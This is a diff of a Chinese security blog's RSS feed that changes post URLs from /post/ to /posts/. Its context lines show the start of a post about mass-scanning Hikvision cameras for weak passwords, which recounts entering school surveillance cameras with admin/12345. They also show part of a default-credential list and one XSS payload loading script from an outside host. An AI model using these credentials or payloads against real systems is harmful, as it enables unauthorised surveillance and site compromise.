@@ -1,4 +1,4 @@
-<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>web - 标签 - zu1k</title><link>https://lgf.im/tags/web/</link><description>web - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Thu, 28 Nov 2019 20:15:06 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/web/" rel="self" type="application/rss+xml"/><item><title>针对海康威视网络摄像头弱密码的一次扫描</title><link>https://lgf.im/post/security/web-security/scan-hikvision-weak-password/</link><pubDate>Thu, 28 Nov 2019 20:15:06 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/scan-hikvision-weak-password/</guid><description><![CDATA[<h2 id="前言">前言</h2>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title>web - 标签 - zu1k</title><link>https://lgf.im/tags/web/</link><description>web - 标签 - zu1k</description><generator>Hugo -- gohugo.io</generator><managingEditor>i@lgf.im (zu1k)</managingEditor><webMaster>i@lgf.im (zu1k)</webMaster><copyright>This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.</copyright><lastBuildDate>Thu, 28 Nov 2019 20:15:06 +0000</lastBuildDate><atom:link href="https://lgf.im/tags/web/" rel="self" type="application/rss+xml"/><item><title>针对海康威视网络摄像头弱密码的一次扫描</title><link>https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/</link><pubDate>Thu, 28 Nov 2019 20:15:06 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/scan-hikvision-weak-password/</guid><description><![CDATA[<h2 id="前言">前言</h2>
 <p>在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。</p>
 <p>海康威视web界面的弱密码是 admin  12345</p>
 <p>时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描</p>
@@ -307,7 +307,7 @@ Ubiquiti: ubnt/ubnt
 Wodsee: admin/
 </code></pre></td></tr></table>
 </div>
-</div>]]></description></item><item><title>xss payload</title><link>https://lgf.im/post/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/post/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
+</div>]]></description></item><item><title>xss payload</title><link>https://lgf.im/posts/security/web-security/xss-payload/</link><pubDate>Sun, 14 Oct 2018 18:11:03 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/web-security/xss-payload/</guid><description><![CDATA[<p>总结了常用的xss payload</p>
 <p>1.普通的XSS JavaScript注入</p>
 <pre><code>&lt;SCRIPT SRC=http://3w.org/XSS/xss.js&gt;&lt;/SCRIPT&gt;
 </code></pre>
